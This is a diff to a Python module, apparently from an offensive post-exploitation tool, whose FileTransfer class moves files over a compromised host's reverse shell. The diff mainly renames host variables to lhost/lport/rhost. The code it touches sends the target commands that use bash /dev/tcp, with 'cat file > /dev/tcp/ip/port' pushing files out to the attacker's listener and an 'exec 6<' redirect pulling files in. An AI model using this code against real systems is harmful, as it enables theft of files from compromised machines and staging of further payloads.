@@ -4,15 +4,15 @@
 from pyrate.file_transfer_listener import PortFileTransfer
 
 class FileTransfer:
-    def __init__(self, host_ip, host_port, current_reverse_shell):
-        self.host_ip = host_ip
-        self.host_port = host_port
+    def __init__(self, lhost, lport, current_reverse_shell):
+        self.lhost = lhost
+        self.lport = lport
         self.file_port = None
         self.reverse_shell = current_reverse_shell
 
     def initiate_target_receive_file(self):
         # wait to give the host time to listen - this sucks, too bad...
-        command = 'sleep 1;exec 6< /dev/tcp/{ip}/{port}\n'.format(ip=self.host_ip, port=self.host_port)
+        command = 'sleep 1;exec 6< /dev/tcp/{ip}/{port}\n'.format(ip=self.lhost, port=self.lport)
         self.reverse_shell.listener.send_data(command)
 
     def write_target_receive_file(self, file_path):
@@ -22,15 +22,15 @@ class FileTransfer:
         #print(return_value)
 
     def target_send_file(self, file_path):
-        command = 'sleep 1;cat {file_path} > /dev/tcp/{ip}/{port}\n'.format(file_path=file_path, ip=self.host_ip,
-                                                                              port=self.host_port)
+        command = 'sleep 1;cat {file_path} > /dev/tcp/{ip}/{port}\n'.format(file_path=file_path, ip=self.lhost,
+                                                                              port=self.lport)
         self.reverse_shell.listener.send_data(command)
         #return_value = self.reverse_shell.listener.send_receive(command)
         #print(return_value)
 
     def initiate_file_port(self):
         if not self.file_port:
-            self.file_port = PortFileTransfer(self.host_ip, self.host_port, self.reverse_shell.target_ip)
+            self.file_port = PortFileTransfer(self.lhost, self.lport, self.reverse_shell.rhost)
             self.file_port.get_connected()
 
     def host_receive_file(self, file_path):
